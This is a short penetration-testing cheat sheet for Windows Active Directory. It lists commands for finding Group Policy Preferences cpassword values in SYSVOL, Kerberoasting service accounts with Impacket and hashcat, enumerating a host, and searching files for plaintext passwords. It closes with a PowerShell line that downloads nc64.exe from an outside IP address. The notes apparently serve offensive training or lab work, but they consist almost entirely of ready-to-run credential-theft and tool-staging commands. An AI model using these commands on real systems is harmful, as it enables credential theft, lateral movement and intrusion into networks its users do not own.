# Credentials

Searching for GPP passwords

> can be run from any machine in domain
```
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policy\*. xml
```
it's a string encoded in AES256 with well known key. To decrypt use gpp-decrypt tool or use metasploit smb_enum_gpp module


# Kerberoasting

Get SPN's (servicies) from DC. Get TGS of the servicies

> Impacket
```
GetUserSPNs.py $domain/$user:#password -dc-ip $ip_addres_of_dc -request
```

After that use hashcat to crack service password (-m 13100)

# Enumeration
## Basics

```
whoami 
systeminfo 
net users 
net localgroups
net user user1 - more info about user
wmic qfe get Caption,Description,HotFixID,InstalledOn - gather how well system is patched
```

## Look for open credentials

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

# Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```

## File download
```
(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.139:8080/nc64.exe', 'nc64.exe')
```
